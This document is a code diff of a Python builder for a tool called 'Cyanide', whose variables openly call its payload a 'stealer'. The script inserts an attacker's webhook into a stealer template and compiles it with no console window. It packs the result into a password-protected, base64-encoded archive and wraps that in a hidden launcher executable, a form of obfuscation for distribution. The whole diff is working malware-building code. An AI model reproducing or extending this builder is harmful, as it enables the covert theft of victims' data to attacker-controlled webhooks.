@@ -1,64 +1,87 @@
-from core.logs import banner
-from colorama import Fore, init
-
-import subprocess
-import shutil
-import os
-import zipfile
+import string
+import random
 import click
-import base64
+import os
+import shutil
+import zipfile
 
-def folderzipping(foldername, target_dir):
+from core.logs import banner
+
+from colorama import Fore
+from base64 import standard_b64encode as b64encode
+
+stealerPath = os.path.join("core", "template", "main.tm")
+launcherPath = os.path.join("core", "template", "launcher.tm")
+
+
+def get_random_string(length=10) -> bytes:
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str.encode()
+
+def zipfolder(foldername, target_dir, password: bytes):
     zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipobj.setpassword(password)
     rootlen = len(target_dir) + 1
     for base, dirs, files in os.walk(target_dir):
         for file in files:
             fn = os.path.join(base, file)
             zipobj.write(fn, fn[rootlen:])
 
-@click.command()
-@click.argument("webhook")
-@click.option('-o', '--output', help='File output', required=True)
 
-def build(webhook: str, output: str):
+@click.command()
+@click.argument("webhook", required=1, type=str)
+@click.option('-o', "--output", type=str, required=1, help="Output file")
+
+def builder(webhook, output):
+    password = get_random_string(20)
+
+    stealerpy = output+".py"
+    stealerzip = output+".zip"
+
+    launcherpy = output+".l"
+
     banner.builder()
     print(f"{'-'*30} Configure Cyanide... {'-'*30}")
-    print(f"[{Fore.CYAN}*{Fore.RESET}] Adding webhook...")
     
-    with open("core/template/main.tm", "r") as f:
+    with open(stealerPath, "r") as f:
         template = f.read().replace(r"%webhook%", webhook)
-
+    
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
     
-    with open(output+".py", "w") as f:
+    with open(stealerpy, "w") as f:
         f.write(template)
-
+    
     print(f"{'-'*30} Compiling Cyanide... {'-'*30}")
-    os.system("pyinstaller --noconsole "+output+".py")
-    os.remove(output+".py")
+    os.system("pyinstaller --noconsole "+stealerpy)
+    os.remove(stealerpy)
+
+    print(f"{'-'*30} Configure launcher... {'-'*30}")
     print(f"[{Fore.CYAN}*{Fore.RESET}] Folder zipping...")
-    folderzipping(output, "dist")
-    zipbase64 = base64.b64encode(open(output+".zip", "rb").read())
-    os.remove(output+".zip")
+    zipfolder(output, os.path.join("dist", output), password)
+
+    zipbase64 = b64encode(open(stealerzip, "rb").read())
+    os.remove(stealerzip)
 
     print(f"{'-'*30} Configure launcher... {'-'*30}")
     print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
-    with open("core/template/launcher.tm", "r") as f:
-        template = f.read().replace(r"%b64zip%", '"'+zipbase64.decode()+'"')
-        template = template.replace(r"%folder%", '"'+output+'"')
-        template = template.replace(r"%exec%", '"'+output+".exe"+'"')
+    with open(launcherPath, "r") as f:
+        template = f.read().replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
+        template = template.replace(r"%password%", 'b"'+password.decode()+'"')
+        template = template.replace(r"%filexec%", '"'+output+".exe"+'"')
     
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing launcher...")
-    with open(output+".ps1", "w") as f:
+    with open(launcherpy, "w") as f:
         f.write(template)
     
     print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
-    subprocess.run(["powershell", "-Command", fr"Invoke-ps2exe .\{output}.ps1 .\{output}.exe"], capture_output=True)
-    # os.remove(output+".ps1")
+    os.system("pyinstaller --onefile --noconsole "+launcherpy)
+    os.remove(launcherpy)
+    shutil.move(os.path.join("dist", output+".exe"), ".")
 
     shutil.rmtree("build")
     shutil.rmtree("dist")
     os.remove(output+".spec")
 
 if __name__ == "__main__":
-    build()
+    builder()
